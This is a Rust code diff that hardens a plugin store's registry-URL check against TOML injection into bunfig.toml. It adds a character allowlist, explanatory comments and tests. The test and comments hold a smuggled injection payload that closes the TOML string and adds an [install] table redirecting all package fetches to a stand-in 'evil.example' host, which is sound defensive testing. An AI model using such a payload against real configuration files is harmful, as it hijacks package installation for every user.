@@ -137,6 +137,49 @@ pub(crate) fn installed_packages(dir: &Path) -> Vec<InstalledPkg> {
     out
 }
 
+/// A registry URL that is safe to write into a hand-formatted TOML string, and plausible as a
+/// registry: absolute https, bounded, and built only from characters that appear in a real URL.
+///
+/// Deliberately a strict allowlist rather than "reject quotes and newlines" — the failure this
+/// guards is TOML injection, and a denylist of the delimiters someone remembers is how the original
+/// `starts_with("https://")` check came to be the only guard at all. No quote, no whitespace, no
+/// control character, no backslash can pass, so `"{scope}" = "{url}"` cannot be closed early.
+fn valid_registry_url(url: &str) -> bool {
+    let Some(rest) = url.strip_prefix("https://") else {
+        return false;
+    };
+    !rest.is_empty()
+        && url.len() <= 512
+        && rest.chars().all(|c| {
+            c.is_ascii_alphanumeric()
+                || matches!(
+                    c,
+                    '-' | '.'
+                        | '_'
+                        | '~'
+                        | ':'
+                        | '/'
+                        | '?'
+                        | '#'
+                        | '['
+                        | ']'
+                        | '@'
+                        | '!'
+                        | '$'
+                        | '&'
+                        | '\''
+                        | '('
+                        | ')'
+                        | '*'
+                        | '+'
+                        | ','
+                        | ';'
+                        | '='
+                        | '%'
+                )
+        })
+}
+
 /// Point a package scope at its registry in the plugins dir's `bunfig.toml`.
 ///
 /// The runner CLI can do this too (`--registry @scope=URL`), but the store must **not** depend on
@@ -149,9 +192,17 @@ pub(crate) fn installed_packages(dir: &Path) -> Vec<InstalledPkg> {
 /// Idempotent and non-destructive, matching `sdk/src/plugins.ts::ensureBunfig`: a scope already
 /// mapped to this URL is left alone, one mapped elsewhere is rewritten, unrelated content survives.
 pub(crate) fn ensure_bunfig_scope(dir: &Path, scope: &str, url: &str) -> Result<()> {
-    // The scope and URL both come from a signature-verified, field-validated index entry
-    // (`@`-prefixed, `[a-z0-9._-]`, https), so neither can smuggle a quote or newline into the TOML.
-    if !index::valid_scoped_pkg(&format!("{scope}/x")) || !url.starts_with("https://") {
+    // Both halves are hand-formatted into TOML below (`"{scope}" = "{url}"`), so both must be
+    // proven unable to close the quote.
+    //
+    // The scope always was. The URL was not: its only guard was `starts_with("https://")`, and
+    // `Entry::registry` — unlike `title`/`description`/`author`/`version` — never goes through
+    // `sanitize`, so everything after the prefix arrived verbatim. A catalog entry whose registry
+    // read `https://ok/"\n[install]\nregistry = "https://evil/` injected a top-level `[install]`
+    // table into the file that tells `bun` where to fetch EVERY package from — and it persists
+    // after the source is deleted, because nothing rewrites this file (2026-08-05 review M-7).
+    // Sources may be unsigned, so "it came from a verified index" was not a guarantee either.
+    if !index::valid_scoped_pkg(&format!("{scope}/x")) || !valid_registry_url(url) {
         bail!("refusing to map scope `{scope}` to `{url}`");
     }
     std::fs::create_dir_all(dir).with_context(|| format!("create {}", dir.display()))?;
@@ -677,6 +728,49 @@ mod tests {
         assert!(ensure_bunfig_scope(dir.path(), "no-at-sign", "https://e/").is_err());
         assert!(ensure_bunfig_scope(dir.path(), "@bad\"quote", "https://e/").is_err());
         assert!(!dir.path().join("bunfig.toml").exists());
+    }
+
+    /// TOML injection through the registry URL (2026-08-05 review M-7). `Entry::registry` never
+    /// goes through `sanitize`, and the old guard was a bare `starts_with("https://")` — so
+    /// everything after the prefix reached a hand-formatted `"{scope}" = "{url}"` verbatim. The
+    /// payload that mattered injects a top-level `[install]` table, redirecting every subsequent
+    /// package resolution, and survives deletion of the source that introduced it.
+    #[test]
+    fn bunfig_registry_url_cannot_inject_a_toml_table() {
+        let dir = tempfile::tempdir().unwrap();
+        let injection = "https://ok.example/\"\n[install]\nregistry = \"https://evil.example/";
+        assert!(
+            ensure_bunfig_scope(dir.path(), "@x", injection).is_err(),
+            "a registry URL that closes the TOML string must be refused"
+        );
+        assert!(!dir.path().join("bunfig.toml").exists());
+
+        // The individual characters that make it possible, each on its own.
+        for bad in [
+            "https://e/\"quote",
+            "https://e/\nnewline",
+            "https://e/\rcarriage",
+            "https://e/ space",
+            "https://e/\ttab",
+            "https://e/back\\slash",
+            "https://e/nul\0byte",
+        ] {
+            assert!(
+                ensure_bunfig_scope(dir.path(), "@x", bad).is_err(),
+                "must refuse registry URL {bad:?}"
+            );
+        }
+        // Real registry URLs — including ports, query strings and percent-escapes — still pass.
+        for good in [
+            "https://git.unom.io/api/packages/unom/npm/",
+            "https://registry.example.com:8443/npm/",
+            "https://example.com/npm/?token=abc%20def",
+        ] {
+            assert!(
+                ensure_bunfig_scope(dir.path(), "@x", good).is_ok(),
+                "must accept registry URL {good:?}"
+            );
+        }
     }
 
     /// The name-shape guard is necessary but NOT sufficient — see `mgmt::store::uninstall_plugin`.
